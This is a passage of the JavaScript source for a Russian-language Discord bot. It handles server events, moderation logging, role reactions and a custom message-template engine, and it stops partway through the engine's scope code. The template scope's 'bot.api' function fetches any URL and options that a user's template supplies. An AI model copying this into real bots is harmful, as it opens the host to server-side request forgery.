// https://discord.com/api/oauth2/authorize?client_id=559291277074628619&permissions=1073741832&scope=applications.commands%20bot
// 𝘁𝗵𝗲𝗿𝗲 𝗶𝘀 𝗰𝗼𝗱𝗲 𝗻𝗮𝘃𝗶𝗴𝗮𝘁𝗶𝗼𝗻 𝗯𝗲𝗹𝗼𝘄. | Снизу находится навигация по коду.
console.clear();

import 'dotenv/config';

import Discord, { User } from "discord.js";
const Collection = Discord.Collection;

import * as Util from "./util.js";


const client = new Discord.Client({ messageCacheMaxSize: 110 });


import fs from "fs";
import fetch from "node-fetch";



const { default: data } = await import("./main/data.json", {
  assert: {type: "json"}
});



client.on("ready", async () => {
  client.options.disableMentions = "everyone";
  client.guilds.cache.forEach(async el => el.invites = await el.fetchInvites().catch(() => {}));

  if (process.env.DEVELOPMENT === "FALSE") {
    client.user.setActivity("намана", {type: "WATCHING"});
  }
  else {
    client.user.setActivity("Кабзец тебе, Хозяин", {type: "STREAMING", url: "https://www.twitch.tv/monstercat"});
  }




//----------------------------------{Events and intervals--}------------------------------                            #0bf


  client.on("message", async msg => {
    if (msg.author.bot) {
      return;
    }

    msg.author.action("message", msg);

    eventHundler(msg);
    commandHundler(msg);
  });

  client.on("inviteCreate", async (invite) => {
    let guild = invite.guild;
    guild.invites = await guild.fetchInvites();
  });

  client.on("inviteDelete", async (invite) => {
    //let guild = invite.guild;
  });

  client.on("guildCreate", async (guild) => {
    let members = guild.members.cache.filter(e => !e.user.bot);
    let whoAdded = await guild.Audit(e => e.target.id === client.user.id, {type: "BOT_ADD"});
    whoAdded = whoAdded ? whoAdded.target : null;

    client.guilds.cache.get("752898200993660959").channels.cache.get("763637440174227506").msg(`Бот присоеденился к серверу ${ guild.name }!`, {description: `Участников: ${ members.size }\nКол-во знакомых боту людей: ${members.filter(e => data.users.some(el => el.id == e.id)).size}\nПригласил пользователь этого сервера?: ${whoAdded && guild.member(whoAdded) ? "Да" : "Нет"}.`, footer: {text: `Серверов: ${client.guilds.cache.size}`}});
    guild.invites = await guild.fetchInvites();
    data.bot.newGuildTimestamp = getTime();
  });

  client.on("guildDelete", async (guild) => {
    client.users.cache.get("921403577539387454").msg(`Бота забанили на сервере ${guild.name}!`);
  })

  client.on("messageReactionAdd", async (reaction, user) => {
    if (reaction.emoji.name == "👍") user.quest("like");

    let msg = reaction.message;
    let rolesReactions = ReactionsManager.reactData.find(el => el.id == msg.id);
    if (!rolesReactions) return;
    switch (rolesReactions.type) {
      case "reactor":
        rolesReactions = rolesReactions.reactions;

        let role = String(rolesReactions[reaction.emoji.id || reaction.emoji.name]);
        if (!role){
          break;
        }
        role = reaction.message.guild.roles.cache.get(role);
        if (!role) {
          reaction.message.msg("Не удалось найти роль, вероятно она удалена", {color: "ff0000", delete: 7000});
          reaction.remove();
          return;
        }
        reaction.message.guild.member(user).roles.add(role);
        break;
    }
  });

  client.on("messageReactionRemove", async (reaction, user) => {
    let msg = reaction.message;
    let rolesReactions = ReactionsManager.reactData.find(el => el.id == msg.id);
    if (!rolesReactions) return;
    switch (rolesReactions.type) {
      case "reactor":
        rolesReactions = rolesReactions.reactions;

        let role = String(rolesReactions[reaction.emoji.id || reaction.emoji.name]);
        role = reaction.message.guild.roles.cache.get(role);
        if (!role) reaction.message.msg("Не удалось найти роль, вероятно она удалена", {color: "ff0000", delete: 7000});
        reaction.message.guild.member(user).roles.remove(role);
        break;
    }
  });

  client.on("guildMemberAdd", async (e) => {
    let guild = e.guild;
    let roles;

    let leaveRoles = guild.data.leave_roles && guild.data.leave_roles[e.user.id];
    if (leaveRoles){
      roles = leaveRoles.map(el => guild.roles.cache.get(el)).filter(el => el);
      e.roles.add(roles);
      delete guild.data.leave_roles[e.user.id];

      leaveRoles = true;
    }

    if (e.user.bot) {
      let whoAdded = await guild.Audit(audit => audit.target.id === e.id, {type: "BOT_ADD"});
      let permissions = e.permissions.toArray().map(e => Command.permissions[e]).join(", ") || "Отсуствуют";
      guild.logSend("Добавлен бот", {author: {iconURL: e.user.avatarURL(), name: e.user.tag}, description: `Название: ${e.user.username}\n${e.user.flags.has("VERIFIED_BOT") ? "Верифицирован 👌" : "Ещё не верифицирован ❗"}\nКоличество серверов: \`неизвестно\`\n\n${whoAdded ? `Бота добавил: ${whoAdded.executor.username}` : ""}`, footer: {text: `Предоставленные права: ${permissions[0] + permissions.slice(1).toLowerCase()}`}});
      return;
    }

    const guildInvites = await guild.fetchInvites();
    const old = guild.invites;
    guild.invites = guildInvites;
    const invite = guildInvites.find(i => old.get(i.code).uses < i.uses);


    if (invite){
      const inviter = invite.inviter;
      guild.logSend("Новый участник!", {description: "Имя: " + e.user.tag + "\nИнвайтнул: " + inviter.tag + "\nПриглашение использовано: " + invite.uses, footer: {text: "Приглашение создано: "}, timestamp: invite.createdTimestamp});

      if (e.id !== inviter.id)
        inviter.quest("inviteFriend");

      inviter.data.invites = nonNaN(inviter.data.invites) + 1;
    }





    if (guild.data.hi && guild.data.hiChannel){
      let channel = guild.channels.cache.get(guild.data.hiChannel);
      if (!channel) {
        return;
      }

      channel.startTyping();
      await delay(3500);
      await channel.msg("На сервере появился новый участник!", {color: guild.data.hi.color, image: guild.data.hi.image, description: guild.data.hi.message, scope: {tag: e.user.toString(), name: e.user.username}});
      channel.stopTyping();
      channel.msg("👋", {embed: true, delete: 150000});

      if (guild.data.hi.rolesId && !leaveRoles){
        roles = guild.data.hi.rolesId.map(el => guild.roles.cache.get(el)).filter(el => el);
        // let attempts = 0;
        // let acceptedRules = false;
        // while (attempts < 100){
        //   if (e.roles.cache.find(e => e.name === "everyone")){
        //     acceptRules = true;
        //     break;
        //   }
        //   await delay(3000);
        // }
        //
        // if (acceptedRules)
        e.roles.add(roles);
      }
    }
  });

  client.on("guildMemberRemove", async (e) => {
    if (!e.guild.data.leave_roles) {
      e.guild.data.leave_roles = {};
    }
    e.guild.data.leave_roles[e.user.id] = Array.from(e.roles.cache.keys());

    let banInfo = (  await e.guild.Audit(audit => audit.target.id === e.id, {limit: 50, type: "MEMBER_BAN_ADD"})  ) || (  await e.guild.Audit(audit => audit.target.id === e.id, {limit: 50, type: "MEMBER_KICK"})  );
    const reason = () => banInfo.reason ? `\nПричина: ${banInfo.reason}` : "";

    const name = `Имя: ${ e.user.tag }${ e.user.bot ? " BOT" : "" }`;

    const message = banInfo ?
      {content: `Участник был ${banInfo.action == "MEMBER_KICK" ? "кикнут" : "забанен"}`, description: `${ name }\nВыгнавший с сервера: ${e.guild.member(banInfo.executor).displayName} ${ JSON.stringify(reason()).slice(0, 1000) }`} :
      {content: "Участник покинул сервер", description: `${ name }\nНадеемся, он скоро вернётся`};

    e.guild.logSend(message.content, {description: message.description, color: banInfo ? "ff0000" : "00ff00"});
  });

  client.on("guildMemberUpdate", async (old, memb) => {
    let nameEdited = memb.user.data.name != memb.user.username || old.displayName != memb.displayName;
    if (nameEdited){
      let inGuild = memb.user.data.name === memb.user.username;
      let names = inGuild ? {old: old.displayName, new: memb.displayName} : {old: memb.user.data.name, new: memb.user.username};
      memb.guild.logSend(`Новое имя: ${names.new}`, {author: {name: inGuild ? "На сервере изменился\nник пользователя" : "Участник изменил свой никнейм", iconURL: memb.user.avatarURL()}, footer: {text: `Старый никнейм: ${names.old}`}});

      if (!inGuild){
        memb.user.data.name = memb.user.username;
      }
      return;
    }

    if (old.roles.cache.size !== memb.roles.cache.size){
      let isRemoved = old.roles.cache.size - memb.roles.cache.size > 0;
      let role = isRemoved ? old.roles.cache.find(e => !memb.roles.cache.get(e.id)) : memb.roles.cache.find(e => !old.roles.cache.get(e.id));

      client.emit("guildMemberRolesUpdate", memb, role, isRemoved);
    }
  });

  client.on("guildMemberRolesUpdate", async (memb, role, isRemoved) => {
    if (role.id === memb.guild.data.mute_role){
      mute(memb, isRemoved);

      let executor = await memb.guild.Audit(audit => audit.target.id === memb.id, {type: "MEMBER_ROLE_UPDATE"});
      if (!executor){
        return;
      }
      executor = executor.executor;

      if (executor.id === client.user.id){
        return;
      }

      let embed = {
        title: isRemoved ? "Мут снят" : "Участнику выдан мут",
        description: isRemoved ? `С участника снята роль мута ограничивающая общение в чатах.` : `Пользователь ${memb.toString()} получил роль мута — это запрещает ему отправлять сообщения во всех чатах`,
        author: { name: memb.displayName, iconURL: memb.user.displayAvatarURL() },
        footer: { text: `Мут ${isRemoved ? "снял" : "выдал"} ${executor.username}`, iconURL: executor.avatarURL() }
      }

      memb.guild.logSend(embed.title, embed);
    }
  });

  client.on("userUpdate", async (old, user) => {
    if (old.avatar === user.avatar){
      return;
    }
    user.guilds.forEach(guild => guild.logSend(`${guild.member(user).displayName} изменил свой аватар`, {author: {name: user.username, iconURL: user.avatarURL({dynamic: true})}, description: "", footer: {text: "Старый аватар", iconURL: old.displayAvatarURL({dynamic: true})}}));
  });

  client.on("raw", async packet => {

    if (!['MESSAGE_REACTION_ADD', 'MESSAGE_REACTION_REMOVE'].includes(packet.t)) return;
    if (packet.d.emoji.name != "👍" && !ReactionsManager.reactData.find(el => el.id == packet.d.message_id)) return;

    const channel = client.channels.cache.get(packet.d.channel_id);
    if (channel.messages.cache.has(packet.d.message_id)) return;
    let message = await channel.messages.fetch(packet.d.message_id);

    const emoji    = packet.d.emoji.id ? `${packet.d.emoji.name}:${packet.d.emoji.id}` : packet.d.emoji.name;
    const reaction = message.reactions.cache.get(emoji);
    if (reaction) reaction.users.cache.set(packet.d.user_id, client.users.cache.get(packet.d.user_id));

    if (packet.t === 'MESSAGE_REACTION_ADD') client.emit('messageReactionAdd', reaction, client.users.cache.get(packet.d.user_id));
    if (packet.t === 'MESSAGE_REACTION_REMOVE') client.emit('messageReactionRemove', reaction, client.users.cache.get(packet.d.user_id));
  });

  process.on("unhandledRejection", error => {
      if (error.message == "Cannot execute action on a DM channel") return console.error("Cannot in DM: " + error.method);
      if (error.message == "Unknown Message") return;
      console.info("Обработчик 1");
	    console.error(error);
  });

  process.on("SIGINT", e => {
    console.info("\n   ЗАВЕРШЕНИЕ...\n");
    data_save();
    fs.writeFileSync("./main/time.json", JSON.stringify(TimeEvent.eventData), (err, input) => false);
    process.exit(1);
  })

  client.ws.on('INTERACTION_CREATE', async interaction => {

    if (interaction.data.custom_id !== "bot_hi" && interaction.data.name !== "help")
      return;



    client.api.interactions(interaction.id, interaction.token).callback.post({data: {
        type: 4,
        data: {
          content: "",
          embeds: [{
            title: interaction.type == 2 ? "Отображение команды:" : "Сообщение удалено",
            description: interaction.type === 2 ? `Если вам нужно подробное описание, введите \`!commandInfo <название команды>\`\nТакже вы можете посетить сервер бота, если у вас есть какие-нибудь вопросы [<https://greenghost>](https://discord.gg/76hCg2h7r8)` : "Зачем удалено, почему удалено, что было бы если бы вы не удалили это сообщение, имело ли это какой-нибудь скрытый смысл...?",
            author: {
              name: interaction.member.user.username,
              icon_url: client.rest.cdn.Avatar(interaction.member.user.id, interaction.member.user.avatar)
            },
            color: 65280
          }]
        }
      }});


    if (interaction.type != 2){
      let message = await client.guilds.cache.get(interaction.guild_id).channels.cache.get(interaction.channel_id).messages.fetch(interaction.message.id);
      message.delete();
      return;
    }

    let
      guild    = client.guilds.cache.get(interaction.guild_id),
      channel  = guild.channels.cache.get(interaction.channel_id),
      author   = guild.members.cache.get(interaction.member.user.id).user,
      message  = {channel, author},

      command  = interaction.data.name.toLowerCase(),
      args     = interaction.data.options;

      message = Object.assign(Object.create(Discord.Message.prototype), message);

       if (command === 'help'){
         commands.help.code(message, {});
      }
  })

  console.info(`\n\n\n     Ready...\n\n`);

  // Pikachu CO-OP
  client.on("message", async msg => {
    if (msg.author.id !== "865242468945362954"){
      return;
    }

    let title = msg.embeds[0] ? msg.embeds[0].title : null;
    if (title === "Происходит обмен..."){
      let { description } = msg.embeds[0];
      const userID = match(description, /(?<=<@!?)\d+(?=\>)/);
      let user = getData(userID);

      let count  = match(description, /(?<=количестве )\d+/);
      let rarity = match(description, /(?<=Переносит )[а-я]+/);

      let index = ["обычную", "редкую", "золотую", "мифическую", "легендарную"].indexOf(rarity);
      let berrys = count * (5 ** index);

      if (index !== 4 && berrys + user.berrys > 350){
        msg.msg("Отдел по отлову клубники...", {description: `Не смог унести такого количества ягод и пал. Перехват клуники не удался.`});
        return;
      }

      user.berrys += berrys;
      msg.msg("Отдел по отлову клубники...", {description: `Отдел по отлову клубники успешно перехватил ${rarity} ягоду в количестве ${ending(count, "единиц", "", "ы", "")}, а также перевёл её в привычный нам вид и оставил на земле.\n${user.name} смог спокойно забрать и унести ${ending(berrys, "клубник", "", "а", "и")} с собой.`, reactions: ["685057435161198594"]});
    }
  });


  TimeEvent.handle();
  CounterManager.clearSuperfluous();
});



//----------------------------------{Functions--}------------------------------                            #0f0



const
  data_save     = () => (data) ? fs.writeFileSync("./main/data.json", JSON.stringify(data), (err, input) => false) : console.error("WARNING: data be undefined"),
  delay         = (ms) => new Promise((response) => setTimeout(response, ms)),
  nonNaN        = (num) => isNaN(num) ? 0 : num,
  getTime       = () => Date.now();


async function msg(msg, opt = {}){
  let obj = this;
  let msgs = this;
  let scope = opt.scope;

  if (typeof msg === "object" && msg instanceof Discord.MessageEmbed === false && msg instanceof Discord.MessageAttachment === false){
    opt = msg;
    msg = opt.message;
  }

  let
    color        = opt.color       || ((process.env.DEVELOPMENT === "FALSE") ? "23ee23" : "000100"),
    offEmbed     = opt.embed       || false,
    description  = opt.description || "",
    react        = opt.reactions,
    edit         = opt.edit,
    thumbnail    = opt.thumbnail,
    image        = opt.image,
    deleted      = opt.delete,

    reference    = opt.reference,

    fields = opt.fields, author = opt.author, files = opt.files, timest = opt.timestamp, footer = opt.footer;


  if (obj instanceof Discord.Message && !edit) {
    obj = obj.channel;
  }

  if (typeof msg === "string"){
    msg = (opt.destroy) ? msg : await template(msg, msgs, scope);
  }


  if (!offEmbed){
    description = (opt.destroy) ? description : await template(description, msgs, scope);

    let embed = new Discord.MessageEmbed().setTitle(msg).setDescription(description).setColor(color).setImage(image || null).setThumbnail(thumbnail || null);
    if (author) embed.author    = author;
    if (footer) embed.footer    = footer;
    if (fields) embed.fields    = fields;
    if (timest) embed.timestamp = timest;

    if (files)  embed.attachFiles(files);
    msg = embed;
  }

  if (msg instanceof Discord.MessageEmbed && edit && !opt.destroy){
    msg.title = await template(msg.title, msgs, scope);
    msg.description = await template(msg.description, msgs, scope);
  }



  if ( opt.editable ){
    delete opt.editable;
    opt.edit = true;
  }



  let message = (!edit) ? obj.send(msg) : obj.edit(msg);
  if (deleted) {
    message.then( e => e.delete({timeout: deleted}) );
  }

  if (react) {
    message.then( message => react.forEach(item => message.react( isNaN(item) ? item : client.emojis.cache.get(item) )) );
  }

  return message;
};

function reactOrMessage(msg, user, ...reactions){
  reactions = reactions.filter(e => e);
  return new Promise(async (resolve, reject) => {
    let stop;

    reactions.forEach(e => msg.react(e));
    msg.awaitReactions((reaction, member) => member.id == user.id && reactions.includes(reaction.emoji.id || reaction.emoji.name), { max: 1, time: 900000}).then(e => {
      if (stop) return;
      stop = true;
      let react = e.first().emoji;
      resolve(react.id || react.name);
    });

    msg.channel.awaitMessages(m => m.author.id == user.id, {max: 1, time: 900000}).then(e => {
      if (stop) return;
      stop = true;
      e.first().delete();
      resolve(e.first());
    });

    await delay(900000);
    msg.reactions.cache.filter(e => e.me).each(e => e.remove());

    resolve(false);
  });
};

function timestampToDate(ms, max){

  if ( isNaN(ms) ){
    return NaN;
  }

	const
	  date = new Date( Math.max(ms, 0) ),
	   s  = date.getUTCSeconds() + "с",
	   m  = date.getUTCMinutes() + "м ",
	   h  = date.getUTCHours() + "ч ",
	   d  = date.getUTCDate() - 1 + "д ",
	   mo = date.getUTCMonth() + "мес. ",
	   y  = date.getUTCFullYear() - 1970 + ((date.getUTCFullYear() - 1970 > 4) ? "л " : "г ");

  let input = add_and(
    [y, mo, d, h, m, s]
    .filter(stamp => +stamp[0])
    .slice(0, max || 7)
    .join(" ")
    .trim()
  );

  if (!input){
    input = `0,${ ms.toString().slice(0, 3) }с`;
  }

	return input;
};

function ending(numb = 0, wordBase, zerofifth, first, second, opt = {}) {
  numb = nonNaN(Number(numb));
  let fix = Infinity;

  if (numb > 20) fix = 10;
  let end = (numb % fix > 4 || numb % fix == 0) ? zerofifth : (numb % fix > 1) ? second : first;

  let input = wordBase + end;
  if (opt.bold) {
    numb = "**" + numb + "**";
  }
  if (!opt.slice){
    input = numb + " " + input;
  }
  return input;
};

function match(str = "", ...reg){
  reg = RegExp(...reg);
  let find = String(str).match(reg);
  return find ? find[0] : false;
}

function add_and(arr, ignore = false) {
  if (typeof arr == "string") {
    arr = arr.includes("&AND") && !ignore ? arr.split("&AND") : arr.split(" ");
    arr = arr.filter(el => el != "" && el != " ");
  }
  if (arr.length == 1) {
    return arr[0];
  }

  if (arr.length > 1) {
    arr.last = "и " + arr.last;
  }
  return arr.join(" ");
}

function similarity(a, b) {

  if (a.toLowerCase() == b.toLowerCase()) return 0;
  a = a.toLowerCase().split("");
  b = b.toLowerCase().split("");
  let i = 0, w = 0;

  while( i < Math.max(a.length, b.length) ){
    if (a[i] == b[i]) {}
    else if (a[i] == b[i + 1] && a[i + 1] == b[i]){
      a[i] = b[i + 1];
      a[i + 1] = b[i];
      b[i] = a[i];
      b[i + 1] = a[i + 1];
      w += 1;
      i++;
    }
    else if (a[i] == b[i + 1]){
      b.splice(i, 1);
      w += 0.75;
    }
    else if (a[i + 1] == b[i] || b[i] == undefined){
      b.splice(i, 0, a[i])
      w += 0.75;
    }
    else {
      b[i] = a[i];
      w += 1;
    }
    i++;
  }
  return w;
};

function getSimilar(arr, str) {
  if (arr.find((el) => el.toLowerCase() === str.toLowerCase())) return str;
  let max = Infinity;
  let input;
  arr.filter(el => el.length - str.length < 2 && el.length - str.length > -2).forEach(el => {
      let w = similarity(str, el);
      if (w < max && w < str.length + 2) max = w, input = el;
  });
  return input || false;
}

async function accept(name, embed, channel, user){
  if (`first_${name}` in user) {
    return true;
  }
  let el = await channel.msg(embed);
  let collected = await el.awaitReact({user: user, type: "all"}, "685057435161198594", "763807890573885456");
  await el.delete();

  if (collected == "685057435161198594") {
    user[`first_${name}`] = 1;
    return true;
  }
  return false;
};

function toDayDate(date){
  if (date instanceof Date === false){
    date = new Date(date);
  }

  const month = (date.getMonth() + 1).toString();
  const day   = date.getDate().toString();

  return `${ day.padStart(2, "0") }.${ month.padStart(2, "0") }`;
}

function random(...params){
  let lastArgument = params.splice(-1).last;
  let options = {round: true};

  if (typeof lastArgument === "object"){
    Object.assign(options, lastArgument);
    lastArgument = params.splice(-1).last;
  }

  const max = lastArgument + Number(options.round);
  const min = params.length ? params[0] : 0;
  let rand = Math.random() * (max - min) + min;

  if (options.round){
    rand = Math.floor(rand);
  }
  return rand;
}

function getData(id, type = "users", specimen = false){
  let element = data[type].find((e) => e.id == id);

  if (!element){
    specimen = specimen || client[type].cache.get(id) || {username: "отступник"};

    element = {
      users: {"id": id, name: specimen.username, coins: 50, level: 1, exp: 0, berrys: 1, chestLevel: 0, void: 0, keys: 0, voidRituals: 0, voidCoins: 0},
      guilds: {"id": id, name: specimen.name, day_msg: 0, msg_total: 0, days: 0, commandsLaunched: 0, coins: 0, commandsUsed: {}}
    }[type];

    data[type].push(element);
  }
  return element;
}


async function template(msg, obj, opt = {}){
  if (typeof msg == "object") return;
  msg = String(msg);

  let matchAll = [];
  const getRegular = async (regular) => {
    matchAll.splice(matchAll.indexOf(regular), 1);
    regular.original = regular.reg;

    if (regular.category == "?"){
      let condition = regular.others.shift();
      regular.reg = regular.reg.slice(condition.start + condition.reg.length - 3);

      let isRight = regular.reg.split(/(?<!\\)\:/).map(e => e.replace("\\:", ":"));
      isRight.splice(1, Infinity, isRight.slice(1).join(":"));
      let isTrue = await getRegular(condition);
      if (isTrue && !["0", "false", "[шаблон Шаблон]", "[шаблон Фунция]", "[ошибка Шаблона]"].includes(isTrue)) {
        regular.reg = isRight[0];
        regular.others.filter(e => e.start > condition.start + condition.reg.length + isRight[0].length).forEach(e => matchAll.splice(matchAll.indexOf(e), 1) && regular.others.splice(regular.others.indexOf(e), 1));
        regular.others.forEach(e => e.start -= 2 + (condition.start + condition.reg.length - regular.start - 1));
      }
      else {
        regular.reg = isRight[1];
        regular.others.filter(e => e.start < condition.start + condition.reg.length + isRight[0].length).forEach(e => matchAll.splice(matchAll.indexOf(e), 1) && regular.others.splice(regular.others.indexOf(e), 1));
        regular.others.forEach(e => e.start -= 3 + (condition.start + condition.reg.length - regular.start - 1) + isRight[0].length);
      }
    }

    let value;
    while (regular.others[0]){
      let other = regular.others.pop();
      // matchAll.splice(matchAll.indexOf(other), 1);
      value = await getRegular(other);
      regular.reg = regular.reg.substring(0, other.start - regular.start - 2) + value + regular.reg.slice(other.start - regular.start + other.reg.length + 1);
    }

    if (regular.category == "?") return regular.reg;

    value = await getFromScope(obj, regular.reg.trim(), opt);
    if (value instanceof Promise) value = await value;
    return value;
  }

  let nesting = [], e;

  for (let i = 0; i < msg.length; i++){
    if ( (e = ["!", "$", "?"].find(e => e == msg[i])) && msg[++i] == "{" && msg[i - 2] != "\\") nesting.push({start: 1 + i, category: e, others: []});
    else if (msg[i] == "{") nesting.push({category: null});
    if (msg[i] == "}" && nesting[0]){
        let regular = nesting.pop();
        if (regular.category === null) continue;
        let reg = msg.substring(regular.start, i);
        if (!reg) continue;

        regular.reg = reg;
        if (nesting[0]) nesting.last.others.push(regular);
        matchAll.push(regular);
    }
  }

  let variablesField;
  if (variablesField = matchAll.find(e => e.category == "$")){
    variablesField.original = variablesField.reg;
    let variables = variablesField.others;
    let normalizedVariables = [];
    while (variables[0]){
      let reg = variables.pop();
      let length = reg.reg.length;
      let value;

      normalizedVariables.unshift(value = await getRegular(reg));
      variablesField.reg = variablesField.reg.substring(0, reg.start - variablesField.start - 2) + value + variablesField.reg.slice(reg.start - variablesField.start + length + 1);
    }
    variables = variablesField.reg.split(/(?<!\\)\,/).map(e => e.replace("\\,", ",").split("="));
    variables.forEach(e => e.splice(1, Infinity, e.slice(1).join("=")));
    variables.forEach(e => opt[e[0].trim()] = e[1].trim());

    matchAll.filter(e => e.start > variablesField.start).forEach(e => e.start -= variablesField.original.length + 3);
    matchAll.splice(matchAll.indexOf(variablesField), 1);

    msg = msg.substring(0, variablesField.start - 2) + msg.slice(variablesField.start + variablesField.original.length + 1);
  }

  while (matchAll[0]){
    let reg = matchAll.last;
    let value = await getRegular(reg);
    msg = msg.substring(0, reg.start - 2) + value + msg.slice(reg.start + reg.original.length + 1);
  }
  return msg;
}

async function getFromScope(obj, template, opt){
  let func, args;

  let way = template.match(/(?:[^.]+?\(.+?\))($|(?=\.))|([a-z0-9_$а-яёъ]+)(?!=[(])/gim);
  if (!way) return `\\!{${template}}`;

  const openScope = {
     guild: {
        get id() {
          return obj.guild.id;
        },
        members: {
          get count(){
            return obj.guild.memberCount;
          },
          get bots(){
            return obj.guild.members.cache.filter(e => e.user.bot).size;
          },
          online: {
            get count(){
              return obj.guild.members.cache.filter(e => e.user.presence.status != "offline").size;
            }
          }
        },
        channels: {
          get count(){
            return obj.guild.channels.cache.size;
          }
        },
        stats: {
          get msgs() {
            return obj.guild.data.day_msg;
          },
          get averageTotal(){
            return Math.round(obj.guild.data.msg_total / obj.guild.data.days) || obj.guild.data.day_msg;
          },
          get msgsTotal(){
            return obj.guild.data.msg_total;
          },
          get recordMessages(){
            return obj.guild.data.day_max;
          },
          get commandsLaunched(){
            let count = Object.values(obj.guild.data.commandsUsed).reduce((acc, e) => acc + e, 0);
            return count - obj.guild.data.commandsLaunched;
          },
          get commandsLaunchedAll(){
            let count = Object.values(obj.guild.data.commandsUsed).reduce((acc, e) => acc + e, 0);
            return count;
          }
        },
        emojis: {
          get get(){
            if (!args) return {false_func: "emojiId"};
            let emoji = obj.guild.emojis.cache.get(args[0]);
            if (emoji) return emoji.toString();
            else throw "Invalid EmojiId";
          },
          get random(){
            return obj.guild.emojis.cache.random().toString();
          }
        },
        variables: {
          get set(){
            if (!args) return {false_func: "{userId} {variable} {value}"};
            if (!args) return {false_func: "{userId} {variable}"};
            if (args[0] != "guild" && args[0].match(/^\d{17,19}$/)){
              throw new Error("Uknow ID");
            }

            let manager = new GuildVariablesManager(obj.guild.id);
            output = manager.set(...args);
            if (output.err){
              let errors = [
                "",
                "Name unknow characters",
                "Limit: Maximum 20 variables",
              ]
              throw new Error(errors[output.err]);
            }
            return output.value;
          },
          get get(){
            if (!args) return {false_func: "{userId} {variable}"};
            if (args[0] != "guild" && args[0].match(/^\d{17,19}$/)){
              throw new Error("Uknow ID");
            }
            let manager = new GuildVariablesManager(obj.guild.id);
            output = manager.get(...args);
            return output.value;
          }
        },
        data: {
          get coins(){
            return obj.guild.data.coins;
          },

          get berrys(){
            return obj.guild.data.berrys;
          },

          get _data(){
            return obj.guild.data;
          }
        }
      },
     bot: {
        get api() {
            if (!args) return {false_func: "{link} <options>"};
            console.info("API " + args);
            let options = {method: "GET"};

            if (args[2]) {
              try { options = JSON.parse(args.slice(1).join(",")); }
              catch (e) { throw new Error("Неверно указаны опции, они должы быть в JSON формате"); }
            }
            console.info(options);
            let response = fetch(args[0], options).then(e => e.text().then(read => {
              try {
                res = {status: e.status, statusText: e.statusText};
                read = JSON.parse(read);
              }
              catch (e) {}
              finally {
                res.read = read;
              }
              return res;
            }));
            return response;
        },
        emojis: {
          get random() {
            return client.emojis.cache.random().toString();
          },
          get get() {
            if (!args) return {false_func: "emojiId"};
            let emoji = client.emojis.cache.get(args[0]);
            if (emoji) return emoji.toString();
            else throw "Invalid EmojiId";
          }
        },
        stats: {
          get averageAll(){
            let guilds = data.guilds.filter(e => e.days);
            let size = guilds.length;
            return Math.round(guilds.reduce((last, e) => last + e.msg_total / e.days, 0) / size);
          },
          get averageToday(){
            let guilds = data.guilds.filter(e => e.day_msg);
            let size = guilds.length;
            return Math.round(guilds.reduce((last, e) => last + e.day_msg, 0) / (size || 1));
          },
          get msgsTotal(){
            let guilds = data.guilds.filter(e => e.msg_total);
            return guilds.reduce((last, e) => last + e.msg_total, 0);
          },
          get msgsToday(){
            let guilds = data.guilds.filter(e => e.day_msg);
            return guilds.reduce((last, e) => last + e.day_msg, 0);
          },
          get commandsLaunched(){
            let count = Object.values(data.bot.commandsUsed).reduce((acc, e) => acc + e, 0);
            return count - data.bot.commandsLaunched;
          },
          get commandsLaunchedAll(){
            let count = Object.values(data.bot.commandsUsed).reduce((acc, e) => acc + e, 0);
            return count;
          }
        },
        users: {
          get count(){
            return data.users.length;
          },
        },
        guilds: {
          get count(){
            return data.guilds.length;
          },
        },
        channels: {
          get count(){
            return client.channels.cache.size;
          }
        },
        methods: {
          get random(){
            if (!args) return {false_func: "{number or string}"};
            if (args[1]) return args.random();
            return random(+args);
          },
          get ending(){
            if (!args) return {false_func: "{num} {word} {0, 5-9} {1} {2-4}"};
            return ending(...args)
          },
          get math(){
            if (!args) return {false_func: "{math regular}"};
            return Math.math(args.join());
          }
        },
        logical: {
          get IfEqual(){
              if (!args) return {false_func: "{oneValue} {twoValue}"};
              if (args[0] == args[1]) return 1;
              else return 0;
          },
          get IfLessZero(){
              if (!args) return {false_func: "{number}"};
              if (isNan(args[0])) throw "number is Not a Number";
              if (args[0] < 0) return 1;
              else return 0;
          }
        },
        other: {
          time: {
            get hours(){
              return new Date().getHours();
            },
            get minutes(){
              return new Date().getMinutes();
            },
            get displayDate(){
              return data.bot.dayDate;
            },
            get time(){
              let date = new Date();
              return `${("0" + date.getHours()).slice(-2)}:${("0" + date.getMinutes()).slice(-2)}`;
            },
            get display(){
              return new Intl.DateTimeFormat("ru-ru", {weekday: "short", hour: "2-digit", minute: "2-digit"}).format(getTime());
            }
          }
        },
        data: {
          get berrysPrise(){
            return data.bot.berrysPrise;
          }
        }
      },
     msg: {
       get content(){
         return obj.content.replace(/!\{/g, "\\!{");
       },
       author: {
         get id(){
           return obj.author.id;
         },
         get name(){
           return obj.author.username;
         },
         data: {
           get coins(){
             return obj.author.data.coins;
           },
           get berrys(){
             return obj.author.data.berrys;
           },
           get void(){
             return obj.author.data.chilli || 0;
           },
           get key(){
             return obj.author.data.keys || 0;
           },
           get chestBonus(){
             return obj.author.data.chestBonus || 0;
           },
           get cooldowns(){
             return Object.fromEntries(
               Object.keys(obj.author.data)
                 .filter(key => key.startsWith("CD"))
                 .map(key => [key, obj.author.data[key]])
             )
           },
           get _data(){
             return obj.author.data;
           }
         }
       }
     },
     variables: opt || {},
     get trash(){
       // if (!args) return {false_func: "Введите аргументы для их удаления"}
       return "";
     },
     get var(){
       if (!args) return {false_func: "{variable} {value}"};
       if (args[1]) openScope.variables[args[0]] = args.slice(1).join(" ");
       return openScope.variables[args[0]];
     }
  };


  let input = openScope;
  let last = input;

  try {
    for (let i = 0; i < way.length; i++) {
      args = false;
      if (func = way[i].match(/\(.+?\)/)){
        // function
        args = way[i].slice(func.index + 1, -1).split(/(?<!\\)\,/).map(e => e.replace("\\,", ",").trim());
        way[i] = way[i].slice(0, func.index);
      }
      input = await input[way[i]];
      if (input === undefined && !args) input = openScope.variables[way[i]];

      if (input === undefined) {
        way.unshift("Scope:/");
        if (typeof last == "object" && last instanceof Array == false) obj.msg("Шаблон 404", {description: "В вашем шаблоне не найдено свойство `" + way[i + 1] + "` по пути: \n" + way.slice(0, i + 1).join(" -> ") + "\nДоступные свойства: `" + ((Object.keys(last).length < 20) ? (Object.keys(last).join("`/`")) : (Object.keys(last).slice(0, 15).join("`/`") + "``/...") || "тут пусто ._.")  + "`"});
        else obj.msg("Шаблон 404", {description: `В вашем шаблоне возникла ошибка: по пути:\n${way.slice(0, i + 1).join(" -> ")}\nЗначение ${last} не имеет свойств.`, delete: 20000});
        return "[шаблон Шаблон]";
      }

      if (input.false_func) {
